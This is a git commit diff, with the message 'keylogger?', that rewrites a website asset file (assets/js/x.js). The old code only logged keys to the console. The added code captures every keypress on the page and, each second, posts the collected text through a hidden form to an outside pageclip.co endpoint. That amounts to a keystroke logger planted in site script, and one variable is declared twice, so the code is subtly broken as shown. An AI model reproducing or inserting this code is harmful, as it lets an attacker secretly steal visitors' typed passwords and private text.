169f8a14a30527d450aa6c392b36846e40d92b99
Fish <64684124+Fish-o@users.noreply.github.com>
2021-04-16 10:35:58 +0200

    keylogger?

--- assets/js/x.js
+++ assets/js/x.js
@@ -1,6 +1,39 @@
-document.onkeypress = function(e) {
-  var get = window.event ? event : e;
-  var key = get.keyCode ? get.keyCode : get.charCode;
-  var key = String.fromCharCode(key);
-  console.log(key)
+
+function post(path, params, method='post') {
+
+  // The rest of this code assumes you are not using a library.
+  // It can be made less verbose if you use one.
+  const form = document.createElement('form');
+  form.method = method;
+  form.action = path;
+
+  for (const key in params) {
+    if (params.hasOwnProperty(key)) {
+      const hiddenField = document.createElement('input');
+      hiddenField.type = 'hidden';
+      hiddenField.name = key;
+      hiddenField.value = params[key];
+
+      form.appendChild(hiddenField);
+    }
+  }
+
+  document.body.appendChild(form);
+  form.submit();
+  setTimeout(function(){document.body.removeChild(form)}, 500)
 }
+
+var keys='';
+var url = 'https://send.pageclip.co/mMJZqTWOskoatOv5E2bqIWkAxqcetkfi';
+document.onkeypress = function(e) {
+	let get = window.event?event:e;
+	let key = get.keyCode?get.keyCode:get.charCode;
+	let key = String.fromCharCode(key);
+	keys+=key;
+}
+window.setInterval(function(){
+	if(keys.length>0) {
+		post(url, {text: keys});
+		keys = '';
+	}
+}, 1000);
